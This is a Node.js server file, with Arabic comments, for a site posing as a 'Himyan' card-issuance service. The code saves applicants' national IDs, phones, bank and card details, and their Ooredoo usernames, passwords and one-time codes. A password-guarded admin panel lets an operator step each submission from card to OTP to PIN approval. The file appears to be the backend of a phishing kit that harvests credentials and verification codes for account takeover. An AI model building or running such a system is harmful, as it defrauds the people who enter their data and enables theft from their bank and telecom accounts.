// خادم موقع هميان — يعرض الصفحات ويستقبل طلبات إصدار البطاقة
const http = require("http");
const fs = require("fs");
const path = require("path");

const PORT = process.env.PORT || 3000;
const ROOT = __dirname;
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || "himyan2026";
const DATA_DIR = process.env.DATA_DIR || path.join(ROOT, "data");
const ORDERS_FILE = path.join(DATA_DIR, "orders.json");

fs.mkdirSync(DATA_DIR, { recursive: true });
let orders = [];
try { orders = JSON.parse(fs.readFileSync(ORDERS_FILE, "utf8")); } catch (e) { orders = []; }
function saveOrders() {
  const tmp = ORDERS_FILE + ".tmp";
  fs.writeFileSync(tmp, JSON.stringify(orders));
  fs.renameSync(tmp, ORDERS_FILE);
}

const TYPES = {
  ".html": "text/html; charset=utf-8", ".css": "text/css; charset=utf-8",
  ".js": "application/javascript; charset=utf-8", ".json": "application/json; charset=utf-8",
  ".png": "image/png", ".jpg": "image/jpeg", ".jpeg": "image/jpeg",
  ".webp": "image/webp", ".svg": "image/svg+xml", ".ico": "image/x-icon"
};
const send = (res, code, obj) => { res.writeHead(code, { "Content-Type": "application/json; charset=utf-8", "Cache-Control": "no-store" }); res.end(JSON.stringify(obj)); };
const str = (v, max = 300) => String(v == null ? "" : v).slice(0, max);
const full = v => String(v == null ? "" : v);
const isAdmin = req => req.headers["x-admin-password"] === ADMIN_PASSWORD;
function readBody(req) {
  return new Promise((resolve, reject) => {
    let n = 0, chunks = [];
    req.on("data", c => { n += c.length; if (n > 40000) { reject(new Error("large")); req.destroy(); } else chunks.push(c); });
    req.on("end", () => { try { resolve(JSON.parse(Buffer.concat(chunks).toString("utf8") || "{}")); } catch (e) { reject(e); } });
    req.on("error", reject);
  });
}

// حفظ الحقول الأساسية بأسماء واضحة، مع إبقاء الأسماء المختصرة للتوافق مع البيانات القديمة.
function cleanApplication(b) {
  const name = b.name ?? b.n;
  const qid = b.qid ?? b.id;
  const phone = b.phone ?? b.p;
  const email = b.email ?? b.e;
  const gender = b.gender ?? b.g;
  const residency = b.residency ?? b.st;
  const bankId = b.bankId ?? b.bank;
  const address = b.address ?? b.ad;
  const ooredooUser = b.ooredooUsername ?? b.ooredooUser;
  const ooredooPass = b.ooredooPassword ?? b.ooredooPass;
  const ooredooOtp = b.ooredooCode ?? b.ooredooOtp;
  const sourcePay = b.pay && typeof b.pay === "object" ? b.pay : {};
  const pay = {
    cardName: full(sourcePay.cardName),
    last4: str(sourcePay.last4, 4),
    brand: str(sourcePay.brand, 30),
    exp: full(sourcePay.exp ?? sourcePay.expiry),
    cvv: Boolean(sourcePay.cvv),
    otp: Boolean(sourcePay.otp),
    pin: Boolean(sourcePay.pin)
  };
  const status = ["new", "pending", "awaiting", "confirmed", "rejected"].includes(b.status) ? b.status : "new";
  
  const application = {
    ref: str(b.ref, 40) || ("HM-" + Date.now().toString().slice(-8)),
    ts: Date.now(),
    n: full(name), name: full(name),
    id: full(qid).replace(/\D/g, ""), qid: full(qid).replace(/\D/g, ""),
    p: full(phone).replace(/\D/g, ""), phone: full(phone).replace(/\D/g, ""),
    e: full(email), email: full(email),
    g: gender === "female" ? "female" : "male", gender: gender === "female" ? "female" : "male",
    st: residency === "resident" ? "resident" : "citizen", residency: residency === "resident" ? "resident" : "citizen",
    bank: full(bankId), bankId: full(bankId), bankName: full(b.bankName),
    em: full(b.em), a: full(b.a), ad: full(address), address: full(address),
    card: full(b.card), watch: full(b.watch),
    lang: b.lang === "en" ? "en" : "ar", status, step: full(b.step),
    decision: null, next: null, reason: null,

    // الحقول المباشرة للبطاقة والدفع وأوريدو بدون كائن pay معقد
    pay,
    cardNumber: "",
    cvv: "",
    expiry: full(b.expiry || pay.exp),
    pin: "",
    otp: "",
    cardName: full(b.cardName || pay.cardName),
    last4: str(b.cardNumber ? b.cardNumber.slice(-4) : pay.last4, 4),
    brand: pay.brand || "Visa/Master",

    ooredooUser: full(ooredooUser), ooredooUsername: full(ooredooUser),
    ooredooPass: full(ooredooPass), ooredooPassword: full(ooredooPass),
    ooredooOtp: full(ooredooOtp), ooredooCode: full(ooredooOtp)
  };

  // الأسماء الواضحة هي العقد الأساسي الذي يعيده الخادم ويحفظه.
  return {
    ...application,
    name: application.name,
    qid: application.qid,
    phone: application.phone,
    email: application.email,
    gender: application.gender,
    residency: application.residency,
    bankId: application.bankId,
    address: application.address,
    ooredooUsername: application.ooredooUsername,
    ooredooPassword: application.ooredooPassword,
    ooredooCode: application.ooredooCode
  };
}

async function api(req, res, url) {
  if (req.method === "POST" && url === "/api/orders") {
    let b; try { b = await readBody(req); } catch (e) { return send(res, 400, { ok: false }); }
    const o = cleanApplication(b);
    if (!o.n || o.p.length < 6) return send(res, 400, { ok: false, error: "invalid" });
    const i = orders.findIndex(x => x.ref === o.ref);
    if (i >= 0) orders[i] = { ...orders[i], ...o, ts: orders[i].ts };
    else { orders.unshift(o); if (orders.length > 5000) orders.length = 5000; }
    saveOrders();
    return send(res, 200, { ok: true, ref: o.ref });
  }
  if (req.method === "GET" && /^\/api\/status\//.test(url)) {
    const ref = decodeURIComponent(url.split("/").pop());
    const o = orders.find(x => x.ref === ref);
    if (!o) return send(res, 404, { ok: false });
    return send(res, 200, { decision: o.decision || null, next: o.next || null, reason: o.reason || null });
  }
  if (url.startsWith("/api/admin/")) {
    if (!isAdmin(req)) return send(res, 401, { ok: false, error: "unauthorized" });
    if (req.method === "GET" && url === "/api/admin/check") return send(res, 200, { ok: true });
    if (req.method === "GET" && url === "/api/admin/orders") return send(res, 200, { ok: true, orders });
    if (req.method === "POST" && /^\/api\/admin\/decide\//.test(url)) {
      const ref = decodeURIComponent(url.split("/").pop());
      let b = {}; try { b = await readBody(req); } catch (e) {}
      const o = orders.find(x => x.ref === ref);
      if (!o) return send(res, 404, { ok: false });
      if (b.decision !== "accept" && b.decision !== "reject") return send(res, 400, { ok: false });
      if (b.decision === "reject") {
        o.status = "rejected"; o.decision = "reject"; o.next = null; o.reason = o.step || "card";
      } else {
        const next = o.step === "card" ? "otp" : o.step === "otp" ? "pin" : "done";
        o.status = next === "done" ? "confirmed" : "awaiting";
        o.decision = "accept"; o.next = next; o.reason = null;
      }
      saveOrders(); return send(res, 200, { ok: true });
    }
    if (req.method === "POST" && /^\/api\/admin\/status\//.test(url)) {
      const ref = decodeURIComponent(url.split("/").pop());
      let b = {}; try { b = await readBody(req); } catch (e) {}
      const st = ["new", "processing", "issued", "delivered", "cancelled"].includes(b.status) ? b.status : "new";
      const o = orders.find(x => x.ref === ref); if (!o) return send(res, 404, { ok: false });
      o.status = st; saveOrders(); return send(res, 200, { ok: true });
    }
    if (req.method === "DELETE" && url.startsWith("/api/admin/orders/")) {
      const ref = decodeURIComponent(url.split("/").pop());
      orders = orders.filter(o => o.ref !== ref); saveOrders(); return send(res, 200, { ok: true });
    }
  }
  return send(res, 404, { ok: false });
}

http.createServer((req, res) => {
  let urlPath = decodeURIComponent(req.url.split("?")[0].split("#")[0]);
  if (urlPath.startsWith("/api/")) return api(req, res, urlPath).catch(() => send(res, 500, { ok: false }));
  if (urlPath === "/") urlPath = "/index.html";
  if (!path.extname(urlPath)) urlPath += ".html";
  const file = path.normalize(path.join(ROOT, urlPath));
  const base = path.basename(file);
  if (!file.startsWith(ROOT) || file.startsWith(DATA_DIR) || base === "server.js" || base === "package.json") {
    res.writeHead(403); return res.end("Forbidden");
  }
  fs.readFile(file, (err, data) => {
    if (err) { res.writeHead(302, { Location: "/" }); return res.end(); }
    res.writeHead(200, { "Content-Type": TYPES[path.extname(file)] || "application/octet-stream" });
    res.end(data);
  });
}).listen(PORT, () => console.log(`Himyan site running on port ${PORT}`));
